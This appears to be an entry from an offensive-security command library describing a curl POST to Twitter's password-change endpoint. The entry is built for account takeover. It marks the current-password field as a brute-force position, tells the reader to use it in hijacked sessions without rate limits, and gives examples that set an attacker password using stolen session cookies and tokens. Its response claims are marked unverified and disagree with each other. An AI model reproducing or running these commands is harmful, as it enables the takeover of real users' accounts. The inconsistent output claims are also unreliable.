---
id: cmd-970157-password-post
data: >-
  curl -X POST "https://api.twitter.com/i/account/change_password.json" -H
  "Content-Type: application/x-www-form-urlencoded" -H "x-csrf-token: ████████"
  -H "authorization: Bearer ████" -H "Cookie: auth_token=██████████; ct0=██████;
  _twitter_sess=████" -d
  "current_password=§&password=newpass&password_confirmation=newpass"
tags:
  - http-post
  - twitter-api
  - brute-force
type: command
output: 'HTTP/1.1 200 OK {"success":true} on match; 403 otherwise'
executor: curl
platforms:
  - Web
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T17:31:43.167Z'
verified: false
validated: true
submitted: true
---
# twitter-password-change-post

## Command

```bash
curl -X POST "https://api.twitter.com/i/account/change_password.json" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "x-csrf-token: ████████" \
  -H "authorization: Bearer ████" \
  -H "Cookie: auth_token=██████████; ct0=██████; _twitter_sess=████" \
  -d "current_password=§&password=newpass&password_confirmation=newpass"
```

## Description

Sends an HTTP POST to Twitter's password change endpoint to verify and update the account password. The current_password parameter is brute-forced by replacing § with payload values. Use in hijacked sessions to bypass auth without rate limits.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| current_password | Victim's current password (payload position for brute-force) | Yes |
| password | New password to set | Yes |
| password_confirmation | Confirmation of new password | Yes |
| x-csrf-token | CSRF protection token from session | Yes |
| authorization | Bearer token for API auth | Yes |
| Cookie | Session cookies including auth_token | Yes |

## Examples

### Basic Usage

```bash
curl -X POST "https://api.twitter.com/i/account/change_password.json" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "current_password=test123&password=newpass&password_confirmation=newpass" \
  -H "Cookie: auth_token=example"
```

### Advanced Usage

```bash
# With full headers for hijacked session
curl -X POST "https://api.twitter.com/i/account/change_password.json" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "x-csrf-token: abc123" \
  -H "authorization: Bearer eyJhbGciOiJIUzI1NiJ9" \
  -H "Cookie: auth_token=██████████; ct0=██████" \
  -d "current_password=guessedpass&password=attackerpass&password_confirmation=attackerpass"
```

## Expected Output

On success (correct current_password): HTTP 200 with JSON like {"message":"Password updated successfully"}. On failure: HTTP 403 or 400 with error like {"errors":[{"code":123,"message":"Invalid password"}]}. No rate limiting allows rapid retries.

## Related

- [[procedures/Brute-Force-Current-Password-with-Burp-Intruder]]
- [[procedures/Setup-and-Intercept-Twitter-Password-Change-Request]]
